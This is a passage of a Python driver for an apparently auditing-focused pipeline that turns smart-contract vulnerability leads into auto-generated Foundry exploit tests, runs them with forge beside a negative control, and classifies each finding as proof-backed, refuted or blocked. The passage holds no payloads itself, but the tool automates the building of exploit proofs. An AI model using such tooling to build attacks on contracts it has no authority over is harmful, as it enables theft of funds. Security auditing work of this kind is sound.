                    return solc_block
                gen_dir = test_dir / "_evm0day_autoproof"
                gen_dir.mkdir(parents=True, exist_ok=True)
                test_file = gen_dir / f"{unit_name}_{fn['name']}_ZeroDay.t.sol"
                test_file.write_text(authored["test_src"])
                if out_dir:
                    out_dir.mkdir(parents=True, exist_ok=True)
                    (out_dir / test_file.name).write_text(authored["test_src"])
                # When the project ships no installed deps / no remappings.txt, the
                # authored test's `forge-std/` (and any OZ) imports cannot resolve
                # in-place; synthesize non-destructive remappings from a sibling
                # OZ-5.x + forge-std checkout for the duration of the run.
                mapping = None
                if _project_needs_remapping_synthesis(project):
                    mapping = _find_sibling_oz_and_forge_std(Path.home() / "audits")
                    if mapping is None:
                        try:
                            test_file.unlink()
                            if not any(gen_dir.iterdir()):
                                gen_dir.rmdir()
                        except OSError:
                            pass
                        return {"verdict": "blocked-with-obligation",
                                "reason": f"{unit_name}.{fn['name']} ({vc}) is deployable "
                                          "in-place but the project ships no installed deps "
                                          "(node_modules/lib absent), no remappings.txt, and "
                                          "no version-compatible forge-std sibling checkout was "
                                          "found to vendor.",
                                "obligation": "install the project deps (forge install) OR "
                                              "provide a forge-std checkout under ~/audits."}
                try:
                    if mapping is not None:
                        with _SynthesizedRemappings(project, mapping):
                            run = run_forge(forge_bin, project, authored["test_match"])
                    else:
                        run = run_forge(forge_bin, project, authored["test_match"])
                finally:
                    # clean the in-place generated test (do NOT pollute the tree)
                    try:
                        test_file.unlink()
                        if not any(gen_dir.iterdir()):
                            gen_dir.rmdir()
                    except OSError:
                        pass
                return _adjudicate_real_run(
                    run, project, str(out_dir / test_file.name) if out_dir else None,
                    unit_name, fn["name"], "deployable-in-place")
        # No auto-author template / no project: honest block.
        ctor_params = _constructor_params(src, unit_name)
        ctor_args = _synthesize_ctor_args(ctor_params or "")
        return {"verdict": "blocked-with-obligation",
                "reason": f"{unit_name}.{fn['name']} ({vc}) is in-tree (ctor args: "
                          f"{(ctor_params or '').strip() or 'none'}) but has no auto-author "
                          "template for its attack shape, and/or requires external-dependency "
                          "mocks (host / dispatcher / token / configure()) not generically "
                          "synthesizable.",
                "obligation": f"author the external-dependency mocks + setUp() deploying "
                              f"{unit_name}, drive {fn['name']} per the vuln-class attack "
                              "template, assert before/after impact, and add a patched/"
                              "no-trigger negative control."}

    if is_abstract:
        return {"verdict": "blocked-with-obligation",
                "reason": f"{unit_name} is an ABSTRACT contract; it cannot be deployed directly.",
                "obligation": f"author a concrete test subclass of {unit_name} (or use the real "
                              "concrete descendant), deploy it, then drive the cited fn."}
    return None


def _rel_import_from(test_file_dir: Path, contract_file: Path) -> str:
    """Compute a relative import path (posix, with leading ./ or ../) from the
    generated test file's directory to the real contract file."""
    rel = os.path.relpath(contract_file, test_file_dir)
    rel = rel.replace(os.sep, "/")
    if not rel.startswith("."):
        rel = "./" + rel
    return rel


def _top_src_subdir(rel_path: str) -> str:
    """Return the top-level dir segment of a workspace-relative path (the dir we
    symlink at the runner root so the target's relative imports resolve)."""
    parts = Path(rel_path).parts
    return parts[0] if len(parts) > 1 else "."


def _adjudicate_real_run(run: Dict[str, Any], proj: Path, scaffold_path: Optional[str],
                         unit: str, fnname: str, mode: str) -> Dict[str, Any]:
    base = {"scaffold_path": scaffold_path, "runner_dir": str(proj),
            "real_proof_mode": mode, "forge_run": run}
    if not run.get("ran"):
        return {**base, "verdict": "blocked-with-obligation",
                "reason": f"forge did not run: {run.get('error', 'unknown')}.",
                "obligation": "ensure forge can run in the self-contained runner."}
    if run.get("compile_fail"):
        return {**base, "verdict": "compile-blocked-with-obligation",
                "reason": "authored PoC did not compile against the real src tree "
                          f"(tail: {run.get('raw_tail','')[-300:]}).",
                "obligation": "the auto-authored harness needs a signature/import fix for "
                              f"{unit}.{fnname}; refine the per-class author."}
    if run.get("timeout"):
        return {**base, "verdict": "blocked-with-obligation",
                "reason": "forge test timed out.", "obligation": "reduce the test cost."}
    ep, cp = run.get("exploit_pass"), run.get("control_pass")
    if ep and cp:
        if mode == "vault-conservation-inplace-real-deploy":
            reason = ("REAL run-backed IN-PLACE: the REAL "
                      f"{unit} was deployed via ERC1967Proxy with only external-dependency "
                      "ERC20/ERC4626 mocks and the cited "
                      f"{unit}.{fnname} was driven via the real withdraw() entrypoint in "
                      "YieldPhase; the exploit test PASSED (accumulator over-decremented by "
                      "base+previewYield -> conservation violated) AND the negative control "
                      "PASSED (PointsPhase decrements base only). Compiled + ran in-place "
                      "against the real OZ/upgradeable dep graph under forge.")
        elif mode == "vault-conservation-repro":
            reason = ("RUN-BACKED faithful self-contained reproduction: the cited "
                      f"{unit}.{fnname} accumulator-over-decrement shape was reproduced "
                      "verbatim-in-shape (real dep graph too deep to auto-deploy); the "
                      "exploit test PASSED (conservation invariant violated) AND the "
                      "negative control PASSED (patched base-only decrement conserves). "
                      "Compiled + ran under forge.")
        else:
            reason = ("REAL run-backed: exploit test PASSED against the real in-tree "
                      f"{unit}.{fnname} AND the negative control PASSED. Compiled + ran "
                      "under forge.")
        return {**base, "verdict": "proof-backed", "reason": reason}
    if not ep:
        return {**base, "verdict": "refuted",
                "reason": "exploit test ran but did NOT reproduce the impact against the "
                          "real entrypoint; the defect does not manifest as authored."}
    return {**base, "verdict": "blocked-with-obligation",
            "reason": "exploit PASSED but the negative control did not PASS as a clean "
                      "baseline.",
            "obligation": "fix the patched-variant control so it is a true negative."}


# ---------------------------------------------------------------------------
# Driver
# ---------------------------------------------------------------------------

CORPUS_PATH = AUDITOOOR_DIR / "reference" / "fetchable_vuln_corpus.jsonl"


def load_corpus_rows() -> List[Dict[str, Any]]:
    rows = []
    if not CORPUS_PATH.exists():
        return rows
    for line in CORPUS_PATH.read_text().splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        try:
            rows.append(json.loads(line))
        except json.JSONDecodeError:
            continue
    return rows


def derive_contract_fn(workspace: Path, rel_path: str, line: Optional[int]
                       ) -> Tuple[Optional[str], Optional[str]]:
    """Read the cited source and derive the enclosing unit name + cited fn."""
    src_file = workspace / rel_path
    if not src_file.exists():
        for p in workspace.rglob(Path(rel_path).name):
            if p.is_file():
                src_file = p
                break
        else:
            return (None, None)
    src = src_file.read_text(errors="ignore")
    unit_name, _, _ = _enclosing_unit(src, line)
    fn = _fn_at_line(src, line)
    return (unit_name, fn["name"] if fn else None)


def load_candidate_from_corpus(case_id: str) -> Tuple[Dict[str, Any], Path]:
    rows = load_corpus_rows()
    match = None
    for r in rows:
        if r.get("case_id") == case_id or r.get("id") == case_id:
            match = r
            break
    if match is None:
        raise ValueError(f"corpus case not found: {case_id}")
    ws = Path(match["local_checkout"]).expanduser().resolve()
    file_line = match.get("file_line", "")
    rel_path, line = parse_file_line(file_line)
    contract, fn = derive_contract_fn(ws, rel_path, line)
    if not contract or not fn:
        raise ValueError(f"could not derive contract/fn from {file_line} for {case_id}")
    cand = {
        "contract": contract,
        "fn": fn,
        "vuln_class": normalize_vuln_class(match.get("vuln_class", "generic")),
        "vuln_class_raw": match.get("vuln_class", ""),
        "file_line": file_line,
        "rel_path": rel_path,
        "line": line,
        "case_id": case_id,
        "split": match.get("split"),
    }
    return cand, ws


def load_candidate_from_queue_row(data: Dict[str, Any], workspace: Optional[Path]) -> Dict[str, Any]:
    """Convert one exploit-queue row into the proof-pipeline candidate shape."""
    if workspace is None:
        raise ValueError("queue-row candidate requires --workspace to derive contract/fn")

    file_line = _first_source_file_line(
        data.get("file_line"),
        data.get("file_lines"),
        data.get("source_refs"),
        data.get("source_ref"),
        workspace=workspace,
    )
    if not file_line:
        raise ValueError("queue-row candidate requires a Solidity source_refs/file_line citation")

    rel_path, line = parse_file_line(file_line)
    contract, fn = derive_contract_fn(workspace, rel_path, line)
    if not contract or not fn:
        raise ValueError(f"could not derive contract/fn from queue-row citation {file_line}")

    vuln_class = data.get("vuln_class") or data.get("attack_class")
    if not vuln_class:
        raise ValueError("queue-row candidate requires attack_class or vuln_class")

    cand = {
        "contract": contract,
        "fn": fn,
        "vuln_class": normalize_vuln_class(vuln_class),
        "vuln_class_raw": vuln_class,
        "file_line": file_line,
        "rel_path": rel_path,
        "line": line,
    }
    for key in ("lead_id", "title", "likely_severity", "severity_confidence",
                "proof_status", "proof_path", "obligation_id", "revision_id",
                "zero_day_proof_envelope"):
        if key in data:
            cand[key] = data[key]
    return cand


def _queue_rows_from_payload(data: Any) -> List[Dict[str, Any]]:
    if isinstance(data, list):
        return [r for r in data if isinstance(r, dict)]
    if not isinstance(data, dict):
        return []
    for key in ("queue", "rows", "candidates"):
        rows = data.get(key)
        if isinstance(rows, list):
            return [r for r in rows if isinstance(r, dict)]
    if data.get("source_refs") or data.get("file_line") or data.get("file_lines"):
        return [data]
    return []


def _row_id(row: Dict[str, Any]) -> str:
    for key in ("lead_id", "candidate_id", "id"):
        if row.get(key):
            return str(row[key])
    return ""


def select_queue_row(data: Any, *, lead_id: Optional[str] = None,
                     queue_index: Optional[int] = None) -> Dict[str, Any]:
    rows = _queue_rows_from_payload(data)
    if not rows:
        raise ValueError("queue JSON contains no candidate rows")
    if lead_id:
        for row in rows:
            if _row_id(row) == lead_id:
                return row
        raise ValueError(f"queue row not found for lead_id={lead_id}")
    if queue_index is not None:
        if queue_index < 0 or queue_index >= len(rows):
            raise ValueError(f"queue_index {queue_index} out of range for {len(rows)} rows")
        return rows[queue_index]
    if len(rows) == 1:
        return rows[0]
    raise ValueError("queue JSON has multiple rows; pass --lead-id or --queue-index")


def load_candidate_from_queue_json(path: str, workspace: Optional[Path],
                                   lead_id: Optional[str] = None,
                                   queue_index: Optional[int] = None) -> Dict[str, Any]:
    data = json.loads(Path(path).read_text())
    row = select_queue_row(data, lead_id=lead_id, queue_index=queue_index)
    return load_candidate_from_queue_row(row, workspace)


def load_candidate(args: argparse.Namespace, workspace: Optional[Path] = None) -> Dict[str, Any]:
    if args.candidate_json:
        data = json.loads(Path(args.candidate_json).read_text())
    else:
        data = {}
    queue_container = (
        not isinstance(data, dict)
        or bool(data.get("queue") or data.get("rows") or data.get("candidates"))
    )
    if _queue_rows_from_payload(data) and queue_container:
        row = select_queue_row(
            data,
            lead_id=getattr(args, "lead_id", None),
            queue_index=getattr(args, "queue_index", None),
        )
        return load_candidate_from_queue_row(row, workspace)
    if not isinstance(data, dict):
        raise ValueError("candidate JSON must be an object or queue row list")
    contract = args.contract or data.get("contract") or data.get("target_contract")
    fn = args.fn or data.get("fn") or data.get("function") or data.get("target_function")
    vuln_class = args.vuln_class or data.get("vuln_class") or data.get("attack_class")
    file_line = _first_source_file_line(
        args.file_line,
        data.get("file_line"),
        data.get("file_lines"),
        workspace=workspace,
    )
    if (not contract or not fn) and data.get("source_refs"):
        return load_candidate_from_queue_row(data, workspace)
    if not (contract and fn and vuln_class):
        raise ValueError("candidate requires contract, fn, and vuln_class")
    rel_path, line = parse_file_line(file_line or "")
    return {
        "contract": contract,
        "fn": fn,
        "vuln_class": normalize_vuln_class(vuln_class),
        "vuln_class_raw": vuln_class,
        "file_line": file_line or "",
        "rel_path": rel_path,
        "line": line,
    }


def run_pipeline(candidate: Dict[str, Any], workspace: Optional[Path],
                 out_dir: Optional[Path], do_run: bool) -> Dict[str, Any]:
    in_tree = resolve_in_tree(workspace, candidate.get("rel_path", ""), candidate["contract"])

    # --- REAL run-backed proof attempt first (iter6-A capability) ---
    if do_run and in_tree:
        real = attempt_real_proof(candidate, workspace, out_dir)
        if real is not None:
            return {
                "schema": SCHEMA,
                "candidate": candidate,
                "workspace": str(workspace) if workspace else None,
                "in_tree": in_tree,
                "scaffold_path": real.get("scaffold_path"),
                "runner_dir": real.get("runner_dir"),
                "real_proof_mode": real.get("real_proof_mode"),
                "forge_bin": resolve_forge(),
                "forge_run": real.get("forge_run"),
                "verdict": real["verdict"],
                "reason": real["reason"],
                "obligation": real.get("obligation"),
                "mock_synthesis_ready": real.get("mock_synthesis_ready"),
                "mock_synthesis_obligations": real.get(
                    "mock_synthesis_obligations"),
                "mock_synthesis_implemented_members": real.get(
                    "mock_synthesis_implemented_members"),
            }

    # --- legacy scaffold path (out-of-tree / --no-run / no real-proof path) ---
    scaffold = build_scaffold(candidate, in_tree)

    out_path = None
    if out_dir:
        out_dir.mkdir(parents=True, exist_ok=True)
        out_path = out_dir / f"{candidate['contract']}_ZeroDayProof.t.sol"
        out_path.write_text(scaffold)

    run_result: Optional[Dict[str, Any]] = None
    forge_bin = None
    if do_run and in_tree:
        forge_bin = resolve_forge()
        if forge_bin and workspace and is_foundry_project(workspace) and out_path:
            run_result = run_forge(forge_bin, workspace,
                                   test_match=f"test_(exploit|negative_control)_{candidate['fn']}")
        elif not forge_bin:
            run_result = {"ran": False, "error": "forge not found on PATH"}
        elif not (workspace and is_foundry_project(workspace)):
            run_result = {"ran": False, "error": "workspace is not a foundry project"}

    verdict, reason = adjudicate(in_tree, run_result if do_run else None)

    return {
        "schema": SCHEMA,
        "candidate": candidate,
        "workspace": str(workspace) if workspace else None,
        "in_tree": in_tree,
        "scaffold_path": str(out_path) if out_path else None,
        "forge_bin": forge_bin,
        "forge_run": run_result,
        "verdict": verdict,
        "reason": reason,
    }


def main(argv: Optional[List[str]] = None) -> int:
    ap = argparse.ArgumentParser(description="End-to-end EVM 0-day PROOF driver.")
    ap.add_argument("--contract")
    ap.add_argument("--fn")
    ap.add_argument("--vuln-class")
    ap.add_argument("--file-line", default="")
    ap.add_argument("--candidate-json")
    ap.add_argument("--queue-json",
                    help="full exploit_queue*.json file; select a row with --lead-id or --queue-index")
    ap.add_argument("--lead-id",
                    help="lead_id/candidate_id/id selector for --queue-json or queued candidate JSON")
    ap.add_argument("--queue-index", type=int,
                    help="zero-based queue row selector for --queue-json or queued candidate JSON")
    ap.add_argument("--corpus-case",
                    help="case_id from reference/fetchable_vuln_corpus.jsonl; "
                         "derives contract/fn/vuln_class/workspace automatically.")
    ap.add_argument("--workspace")
    ap.add_argument("--out-dir")
    ap.add_argument("--out-json",
                    help="write the JSON result to this path in addition to stdout")
    ap.add_argument("--no-run", action="store_true",
                    help="scaffold only; do not invoke forge")
    ap.add_argument("--json", action="store_true")
    args = ap.parse_args(argv)

    corpus_workspace: Optional[Path] = None
    arg_workspace = Path(args.workspace).expanduser().resolve() if args.workspace else None

    # --- cross-language pre-route: a Go/Rust lead no longer dead-ends here. ---
    # Before the EVM-specific candidate derivation (which raises on a non-.sol
    # citation), peek at the raw lead. If it is Go or Rust, route to the
    # cross-language proof path and return its verdict.
    if not args.corpus_case:
        raw_lead: Dict[str, Any] = {}
        try:
            if args.queue_json:
                qdata = json.loads(Path(args.queue_json).read_text())
                raw_lead = select_queue_row(qdata, lead_id=args.lead_id,
                                            queue_index=args.queue_index)
            elif args.candidate_json:
                cdata = json.loads(Path(args.candidate_json).read_text())
                if isinstance(cdata, dict):
                    raw_lead = cdata
            else:
                raw_lead = {}
        except (ValueError, json.JSONDecodeError, OSError):
            raw_lead = {}
        # explicit CLI args also inform language
        if args.vuln_class:
            raw_lead.setdefault("attack_class", args.vuln_class)
        language = detect_lead_language(raw_lead, args.file_line or "")
        if language in ("go", "rust"):
            result = route_to_cross_language(
                raw_lead, language, workspace=arg_workspace,
                lead_id=args.lead_id, do_run=not args.no_run, out_json=args.out_json)
            if args.json:
                print(json.dumps(result, indent=2))
            else:
                print(f"language: {result.get('language', language)}")
                print(f"verdict:  {result.get('verdict')}")
                print(f"reason:   {result.get('reason')}")
            return VERDICT_EXIT.get(result.get("verdict", "error"), 2)

    try:
        if args.corpus_case:
            candidate, corpus_workspace = load_candidate_from_corpus(args.corpus_case)
        elif args.queue_json:
            candidate = load_candidate_from_queue_json(
                args.queue_json,
                arg_workspace,
                lead_id=args.lead_id,
                queue_index=args.queue_index,
            )
        else:
            candidate = load_candidate(args, arg_workspace)
    except (ValueError, json.JSONDecodeError, OSError) as e:
        payload = {"schema": SCHEMA, "verdict": "error", "reason": str(e)}
        print(json.dumps(payload, indent=2) if args.json else f"ERROR: {e}")
        return 2

    workspace = arg_workspace if arg_workspace else corpus_workspace
    out_dir = Path(args.out_dir).expanduser().resolve() if args.out_dir else None
    do_run = not args.no_run

    result = run_pipeline(candidate, workspace, out_dir, do_run)

    if args.out_json:
        out_json = Path(args.out_json).expanduser().resolve()
        out_json.parent.mkdir(parents=True, exist_ok=True)
        out_json.write_text(json.dumps(result, indent=2) + "\n")

    if args.json:
        print(json.dumps(result, indent=2))
    else:
        print(f"verdict: {result['verdict']}")
        print(f"reason:  {result['reason']}")
        print(f"in_tree: {result['in_tree']}")
        if result.get("obligation"):
            print(f"obligation: {result['obligation']}")
        if result.get("real_proof_mode"):
            print(f"mode: {result['real_proof_mode']}")
        if result.get("scaffold_path"):
            print(f"scaffold: {result['scaffold_path']}")
        if result.get("forge_run"):
            fr = result["forge_run"]
            print(f"forge: exploit_pass={fr.get('exploit_pass')} control_pass={fr.get('control_pass')}")

    return VERDICT_EXIT.get(result["verdict"], 2)


if __name__ == "__main__":
    sys.exit(main())
